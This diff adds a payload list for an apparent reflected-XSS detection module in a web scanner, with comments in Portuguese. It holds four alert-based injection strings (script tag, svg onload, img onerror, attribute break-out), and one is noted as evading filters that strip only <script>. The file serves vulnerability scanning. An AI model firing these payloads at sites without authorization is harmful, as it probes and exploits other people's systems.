@@ -1,0 +1,8 @@
+# Payloads de XSS refletido (issue #11). Formato: id<TAB>valor<TAB>descrição.
+# {marker} é trocado pelo XssModule por um marcador único a cada requisição; é ele que o
+# detector procura na resposta. Ordem = ordem de envio (o módulo para no primeiro positivo).
+
+xss-script	<script>alert('{marker}')</script>	tag script clássica
+xss-svg-onload	<svg onload=alert('{marker}')>	evento onload em svg; passa por filtros que só removem <script>
+xss-img-onerror	<img src=x onerror=alert('{marker}')>	evento onerror em img com src inválido
+xss-attr-break-svg	"><svg onload=alert('{marker}')>	fecha atributo entre aspas duplas e a tag antes de injetar
